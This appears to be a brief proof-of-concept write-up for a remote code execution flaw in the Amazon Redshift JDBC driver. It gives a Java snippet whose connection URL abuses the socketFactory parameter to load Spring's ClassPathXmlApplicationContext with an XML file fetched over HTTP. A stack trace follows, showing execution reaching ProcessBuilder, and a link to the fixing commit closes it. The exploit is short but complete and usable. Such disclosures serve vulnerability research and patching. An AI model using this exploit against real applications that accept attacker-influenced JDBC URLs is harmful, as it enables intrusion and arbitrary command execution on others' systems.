## poc
```java
String driver = "com.amazon.redshift.jdbc.Driver";
String url = "jdbc:redshift://64.64.232.159:3306/mysql?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:9999/1.xml";
Class.forName(driver);
Connection conn = DriverManager.getConnection(url);
```

## stack
```java
start:1007, ProcessBuilder (java.lang)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
execute:139, ReflectiveMethodExecutor (org.springframework.expression.spel.support)
getValueInternal:139, MethodReference (org.springframework.expression.spel.ast)
access$000:55, MethodReference (org.springframework.expression.spel.ast)
getValue:386, MethodReference$MethodValueRef (org.springframework.expression.spel.ast)
getValueInternal:92, CompoundExpression (org.springframework.expression.spel.ast)
getValue:112, SpelNodeImpl (org.springframework.expression.spel.ast)
getValue:273, SpelExpression (org.springframework.expression.spel.standard)
evaluate:167, StandardBeanExpressionResolver (org.springframework.context.expression)
evaluateBeanDefinitionString:1631, AbstractBeanFactory (org.springframework.beans.factory.support)
doEvaluate:280, BeanDefinitionValueResolver (org.springframework.beans.factory.support)
evaluate:237, BeanDefinitionValueResolver (org.springframework.beans.factory.support)
resolveValueIfNecessary:205, BeanDefinitionValueResolver (org.springframework.beans.factory.support)
applyPropertyValues:1707, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)
populateBean:1452, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)
doCreateBean:619, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)
createBean:542, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)
lambda$doGetBean$0:335, AbstractBeanFactory (org.springframework.beans.factory.support)
getObject:-1, 730923082 (org.springframework.beans.factory.support.AbstractBeanFactory$$Lambda$15)
getSingleton:234, DefaultSingletonBeanRegistry (org.springframework.beans.factory.support)
doGetBean:333, AbstractBeanFactory (org.springframework.beans.factory.support)
getBean:208, AbstractBeanFactory (org.springframework.beans.factory.support)
preInstantiateSingletons:955, DefaultListableBeanFactory (org.springframework.beans.factory.support)
finishBeanFactoryInitialization:918, AbstractApplicationContext (org.springframework.context.support)
refresh:583, AbstractApplicationContext (org.springframework.context.support)
<init>:144, ClassPathXmlApplicationContext (org.springframework.context.support)
<init>:85, ClassPathXmlApplicationContext (org.springframework.context.support)
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:423, Constructor (java.lang.reflect)
instantiate:60, ObjectFactory (com.amazon.redshift.util)
getSocketFactory:41, SocketFactoryFactory (com.amazon.redshift.core)
openConnectionImpl:192, ConnectionFactoryImpl (com.amazon.redshift.core.v3)
openConnection:51, ConnectionFactory (com.amazon.redshift.core)
<init>:325, RedshiftConnectionImpl (com.amazon.redshift.jdbc)
makeConnection:499, Driver (com.amazon.redshift)
connect:312, Driver (com.amazon.redshift)
getConnection:664, DriverManager (java.sql)
getConnection:270, DriverManager (java.sql)
main:14, JDBCVuln (com.kuron3k0.javavulns)
```

## referrence
- https://github.com/aws/amazon-redshift-jdbc-driver/commit/9999659bbc9f3d006fb02a0bf39d5bcf3b503605
